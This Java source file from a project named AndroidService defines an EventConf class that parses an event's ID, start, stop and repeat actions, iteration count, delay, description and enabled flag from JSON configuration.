/* *********************************************
 * Create by : Alberto "Quequero" Pelliccione
 * Company   : HT srl
 * Project   : AndroidService
 * Created   : 01-dec-2010
 **********************************************/

package com.android.service.event;

import org.json.JSONException;
import org.json.JSONObject;

import com.android.service.action.Action;
import com.android.service.agent.AgentConf;
import com.android.service.conf.JSONConf;

// TODO: Auto-generated Javadoc
/**
 * The Class Event.
 */
public class EventConf extends JSONConf {

	/** Event unique ID. */
	private final int eventId;

	public int startAction = Action.ACTION_NULL;
	public int stopAction = Action.ACTION_NULL;
	public int repeatAction = Action.ACTION_NULL;
	public int iter = Integer.MAX_VALUE;
	public int delay = 0;
	
	final public String desc;

	public boolean enabled;
	
	public EventConf(int eventId, String eventType, JSONObject params) throws JSONException {
		super(eventType, params);

		this.eventId = eventId;
		startAction = params.getInt("start");

		if (params.has("stop")) {
			stopAction = params.getInt("stop");
		}
		if (params.has("repeat")) {
			repeatAction = params.getInt("repeat");
		}
		
		if (params.has("iter")) {
			iter=params.getInt("iter");
		}
		if (params.has("delay")) {
			delay=params.getInt("delay");
		}
				
		desc = params.getString("desc");
		enabled = params.getBoolean("enabled");
	}

	/**
	 * Gets the id.
	 * 
	 * @return the id
	 */
	public int getId() {
		return this.eventId;
	}


}
